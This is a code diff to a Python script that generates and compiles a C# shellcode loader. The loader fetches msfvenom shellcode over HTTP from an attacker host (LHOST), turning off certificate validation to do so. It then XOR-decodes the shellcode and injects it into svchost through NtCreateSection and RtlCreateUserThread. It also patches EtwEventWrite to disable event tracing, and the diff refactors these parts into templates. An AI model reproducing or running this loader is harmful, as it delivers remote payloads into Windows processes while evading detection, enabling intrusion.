@@ -16,9 +16,12 @@ XOR_KEY = b'\x00'
 WEBROOT = "/var/www/html"
 SHELLCODE_PATH = "/sc"
 SHELLCODE32_PATH = "/sc32"
+STAGER_URL = f"http://{LHOST}/sc"
 
-def generate(shellcode):
+def generate():
   svchost_path = Obfuscator(SVCHOST_PATH)
+
+  url_dl_code = URL_DL_CODE.format(STAGER_URL=STAGER_URL)
 
   template = """
 using System;
@@ -38,12 +41,6 @@ namespace LeMans
 
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr GetCurrentProcess();
 
         [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
         static extern UInt32 NtCreateSection(
@@ -106,67 +103,15 @@ namespace LeMans
         [DllImport("ntdll.dll", SetLastError=true)]
         static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);
 
-        private static byte[] getETWPayload()
-        {{
-            if (!is64Bit())
-                return Convert.FromBase64String("whQA");
-            return Convert.FromBase64String("ww==");
-        }}
-
-        private static bool is64Bit()
-        {{
-            if (IntPtr.Size == 4)
-                return false;
-
-            return true;
-        }}
-
-          private static void PatchEtw(byte[] patch)
-        {{
-            try
-            {{
-                uint oldProtect;
-
-                var ntdll = LoadLibrary("ntdll.dll");
-                var etwEventSend =   GetProcAddress(ntdll, "EtwEventWrite");
-
-                VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
-                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
-            }}
-            catch
-            {{
-                Console.WriteLine("Error unhooking ETW");
-            }}
-
-        }}
-
+        {HEURISTICS_IMPORT}
+        {ARCH_DETECTION}
+        {ETW_FUNCS}
 
         public static void ferrari()
         {{
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-            if (mem == null)
-            {{
-                return;
-            }}
-
-            PatchEtw(getETWPayload());
-
-            string url = "http://{LHOST}/{SHELLCODE_PATH}";
-
-            if (!is64Bit())
-                url = "http://{LHOST}/{SHELLCODE32_PATH}";
-
-
-            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-            System.Net.WebClient client = new System.Net.WebClient();
-            byte[] buf = client.DownloadData(url);
-
-            // byte[] buf = new byte[] {{ {xor_shellcode} }};
-
-            for (int i = 0; i < buf.Length; i++)
-            {{
-                buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
-            }}
+            {HEURISTICS_CODE}
+            {ETW_PATCH}
+            {URL_DL_CODE}
 
          // The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
 
@@ -227,13 +172,17 @@ namespace LeMans
         }}
     }}
 }}
-""".format(xor_shellcode=shellcode.get_hex_csharp(),xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp(),SHELLCODE_PATH=SHELLCODE_PATH,SHELLCODE32_PATH=SHELLCODE32_PATH)
+""".format(HEURISTICS_IMPORT=HEURISTICS_IMPORT,
+           HEURISTICS_CODE=HEURISTICS_CODE,
+           ARCH_DETECTION=ARCH_DETECTION,
+           ETW_FUNCS=ETW_FUNCS,
+           ETW_PATCH=ETW_PATCH,
+           URL_DL_CODE=url_dl_code)
 
   print(template)
   f = open(BASE_FILENAME + '.cs', "w")
   f.write(template)
   f.close()
-
 
 def compile():
   cmd = f"mcs /target:library {BASE_FILENAME}.cs"
@@ -242,7 +191,7 @@ def compile():
 def main():
   shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
   shellcode32 = ShellCode(MSFVENOM32_CMD, xor_key=XOR_KEY)
-  generate(shellcode)
+  generate()
   compile() 
 
   # Write 64bit shellcode
